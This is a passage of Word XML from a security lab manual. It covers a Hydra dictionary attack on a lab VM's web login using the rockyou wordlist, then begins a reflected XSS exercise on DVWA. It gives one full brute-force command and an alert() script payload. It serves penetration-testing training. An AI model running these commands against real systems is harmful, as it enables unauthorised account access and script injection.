        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01789EF1" w14:textId="1859060E" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH1Module"/>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc20923053"/>
      <w:bookmarkStart w:id="6" w:name="_Toc24978029"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Lab 3</w:t>
      </w:r>
      <w:r w:rsidRPr="007F7488">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Dictionary Attack using </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Hydra</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
      <w:bookmarkEnd w:id="6"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B7631C9" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r w:rsidRPr="007F7488">
        <w:t>Objective</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5060A245" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00AB569D">
        <w:t xml:space="preserve">In this lab, you will </w:t>
      </w:r>
      <w:r>
        <w:t>demonstrate how to use Hydra to brute-force the credentials of a website.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="263E0387" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="341A14BB" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r>
        <w:t>Resources</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="679A16BC" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">This lab requires </w:t>
      </w:r>
      <w:r w:rsidRPr="009B3532">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Kali VM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="009B3532">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Hydra VM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D670B1B" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1521D85D" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r w:rsidRPr="007F7488">
        <w:t xml:space="preserve">Step 1: </w:t>
      </w:r>
      <w:r>
        <w:t>Load the Virtual Machines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E761B2F" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>Navigate to your desktop and double click the Hyper-V Manager icon to start the VM manager.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23FDCB25" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="03948415" wp14:editId="739BBEB7">
            <wp:extent cx="399570" cy="435895"/>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01.PNG"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="405608" cy="442482"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A670196" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>In the Hyper-V Manager window, double-click on Kali VM and Hydra VM.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB4CBB5" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="008C2890">
        <w:t>In the new window</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="008C2890">
        <w:t xml:space="preserve"> that will appear press "Start"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="008C2890">
        <w:t xml:space="preserve">to start </w:t>
      </w:r>
      <w:r>
        <w:t>each</w:t>
      </w:r>
      <w:r w:rsidRPr="008C2890">
        <w:t xml:space="preserve"> VM.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF7AE06" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00346488" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251960320" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="38F06F50" wp14:editId="7AEB1B36">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>109593</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>647738</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="719674" cy="345781"/>
                <wp:effectExtent l="50800" t="38100" r="29845" b="73660"/>
                <wp:wrapNone/>
                <wp:docPr id="66" name="Straight Arrow Connector 66"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvCnPr/>
                      <wps:spPr>
                        <a:xfrm flipV="1">
                          <a:off x="0" y="0"/>
                          <a:ext cx="719674" cy="345781"/>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A3F1BBE" id="_x0000_t32" coordsize="21600,21600" o:spt="32" o:oned="t" path="m,l21600,21600e" filled="f">
                <v:path arrowok="t" fillok="f" o:connecttype="none"/>
                <o:lock v:ext="edit" shapetype="t"/>
              </v:shapetype>
              <v:shape id="Straight Arrow Connector 66" o:spid="_x0000_s1026" type="#_x0000_t32" style="position:absolute;margin-left:8.65pt;margin-top:51pt;width:56.65pt;height:27.25pt;flip:y;z-index:25196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" strokecolor="#ca1e17 [3205]" strokeweight="2pt">
                <v:stroke endarrow="block"/>
                <v:shadow on="t" color="black" opacity="24903f" origin=",.5" offset="0,.55556mm"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="00571218">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="287FEDF1" wp14:editId="40844633">
            <wp:extent cx="4787153" cy="2902885"/>
            <wp:effectExtent l="0" t="0" r="1270" b="5715"/>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03.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791817" cy="2905713"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EDC231F" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00825763" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="5E3C61B5" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">When the </w:t>
      </w:r>
      <w:r w:rsidRPr="000B5BD7">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Kali VM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> finishes booting up, login using the credentials below:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7D49ED" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r>
        <w:t>Username:</w:t>
      </w:r>
      <w:r w:rsidRPr="005D5B42">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve"> root</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A89D586" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r>
        <w:t>Password:</w:t>
      </w:r>
      <w:r w:rsidRPr="005D5B42">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005D5B42">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>toor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="74D15A01" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="1E76E0E3" w14:textId="2A4A15D7" w:rsidR="0023150F" w:rsidRPr="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="519E1624" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Step 2: Conduct the Brute Force </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>attack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="38C44D54" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00A10BF3" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">In the </w:t>
      </w:r>
      <w:r w:rsidRPr="00A90942">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve">Kali VM </w:t>
      </w:r>
      <w:r>
        <w:t>launch the</w:t>
      </w:r>
      <w:r w:rsidRPr="00A10BF3">
        <w:t xml:space="preserve"> Firefox browser, navigate to the </w:t>
      </w:r>
      <w:r w:rsidRPr="00A90942">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Hydra VM's</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00A10BF3">
        <w:t xml:space="preserve">IP address to see a webpage which is being hosted. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DD758B8" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00A10BF3" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00A10BF3">
        <w:t xml:space="preserve">If you click the link on the page, it will prompt you for a username and password. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29737671" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="4D93A098" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00A10BF3" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00A10BF3">
        <w:t xml:space="preserve">The hint on the webpage informs you that the username is </w:t>
      </w:r>
      <w:r w:rsidRPr="00A10BF3">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
      <w:r w:rsidRPr="00A10BF3">
        <w:t xml:space="preserve">, but it doesn’t give away the password. We will use Hydra to try to brute-force the password. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3384D55D" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="09FA2B14" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00A10BF3" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00A10BF3">
        <w:t xml:space="preserve">Return to the terminal window and type: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D534D05" w14:textId="150D11CC" w:rsidR="0023150F" w:rsidRPr="00A10BF3" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00A10BF3">
        <w:t>hydra -l admin -P /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A10BF3">
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A10BF3">
        <w:t>/share/wordlists/rockyou.txt</w:t>
      </w:r>
      <w:r w:rsidR="000B6B2B">
        <w:t>.gz</w:t>
      </w:r>
      <w:r w:rsidRPr="00A10BF3">
        <w:t xml:space="preserve"> 192.168.</w:t>
      </w:r>
      <w:r>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00A10BF3">
        <w:t xml:space="preserve">.95 -V http-get “/secure” </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FBE9FD7" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="2C5E4B14" w14:textId="0D6AE310" w:rsidR="00947ABA" w:rsidRDefault="00947ABA" w:rsidP="0023150F">
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>or</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> go to the file </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>rockyou</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> location and unzip it and then have the command without the ending .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>gz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F06F1F1" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>Leave Hydra to run for a few minutes and record the cracked password.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="387C878A" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="1C687C92" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00A10BF3" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00A10BF3">
        <w:t xml:space="preserve">Return to the Firefox browser and try the credentials you have discovered to see if you can now login. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7FB2CB" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="10FB1A13" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="0C23F5FD" w14:textId="38E7A06F" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00046A04">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve">End of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Lab</w:t>
      </w:r>
      <w:r w:rsidRPr="00046A04">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA0AF65" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61759047" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="762CE4C8" w14:textId="2994F4CF" w:rsidR="0023150F" w:rsidRPr="006D13E5" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH1Module"/>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc24978030"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Lab</w:t>
      </w:r>
      <w:r w:rsidRPr="006D13E5">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="006D13E5">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:t>Cross-Site Scripting Attack</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w14:paraId="3351C990" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00DF756F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r w:rsidRPr="00DF756F">
        <w:t>Objective</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63AE6B5B" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00DF756F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00DF756F">
        <w:t xml:space="preserve">In this exercise, you </w:t>
      </w:r>
      <w:r>
        <w:t>will demonstrate some</w:t>
      </w:r>
      <w:r w:rsidRPr="00DF756F">
        <w:t xml:space="preserve"> possible effects of an XSS attack. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35597E4A" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00DF756F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="454EBCDE" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00DF756F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r w:rsidRPr="00DF756F">
        <w:t>Resources</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B05E45" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00DF756F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">This demo requires the </w:t>
      </w:r>
      <w:r w:rsidRPr="00B1623B">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Kali VM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B1623B">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B1623B">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve"> VM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Kali should still be running from the previous demo, so just start the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006F0562">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006F0562">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve"> VM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> up and make sure it has fully loaded before proceeding to the next step.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211D842A" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="046405EB" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00B617AD" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc20923054"/>
      <w:r w:rsidRPr="00B617AD">
        <w:t xml:space="preserve">Step 2: Navigate to the DVWA </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B617AD">
        <w:t>website</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0C43C6DD" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00B617AD" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00B617AD">
        <w:t xml:space="preserve">In the </w:t>
      </w:r>
      <w:r w:rsidRPr="00B617AD">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Kali VM</w:t>
      </w:r>
      <w:r w:rsidRPr="00B617AD">
        <w:t>, launch the Firefox browser. In Firefox, type the following address in the address bar to navigate to the DVWA's login page:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F30D27F" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00B617AD" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00B617AD">
        <w:t>http://192.168.1.99/dvwa</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F080D2E" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00B617AD" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="62EE7CA5" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00B617AD" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00B617AD">
        <w:t>Login to the DVWA website using the following credentials:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7230A519" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00B617AD" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00B617AD">
        <w:t>Username: admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F3AA425" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00B617AD" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00B617AD">
        <w:t>Password: password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B80738" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00B617AD" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="09F9B8C7" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00B617AD">
        <w:t>Once logged in, click on the "</w:t>
      </w:r>
      <w:r w:rsidRPr="00B617AD">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>DVWA Security</w:t>
      </w:r>
      <w:r w:rsidRPr="00B617AD">
        <w:t>" button on the left-hand sidebar and set the security to "Low" then click "Submit" to save the changes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C325E11" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="434F9FB9" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Step 2: Conducting a simple Reflected XSS </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>attack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="60AF451C" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>On the left-hand sidebar c</w:t>
      </w:r>
      <w:r w:rsidRPr="00B31078">
        <w:t>lick the link for XSS Reflected webpage.</w:t>
      </w:r>
      <w:r w:rsidRPr="00B31078">
        <w:br/>
        <w:t>Enter the following in the text box</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and click "Submit"</w:t>
      </w:r>
      <w:r w:rsidRPr="00B31078">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EFB3942" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00B31078">
        <w:t>&lt;script&gt;alert(‘bob</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B31078">
        <w:t>’)&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B31078">
        <w:t xml:space="preserve">/script&gt; </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D07D01" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00B31078" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="47587C02" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00B31078" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00B31078">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> INCLUDEPICTURE "C:\\var\\folders\\pw\\vm3q16yn7979gffjlgg9jrwc0000gn\\T\\com.microsoft.Word\\WebArchiveCopyPasteTempFiles\\page71image55279616" \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00B31078">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4C7EDD1C" wp14:editId="39F564BF">
            <wp:extent cx="4057170" cy="1224742"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="19" name="Picture 19" descr="page71image55279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age71image5527961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070396" cy="1228735"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="00B31078">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="289A411A" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="40C05D42" w14:textId="52807AA5" w:rsidR="0023150F" w:rsidRPr="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="2EC68C83" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>This will produce the following URL in the address bar.</w:t>
      </w:r>
    </w:p>
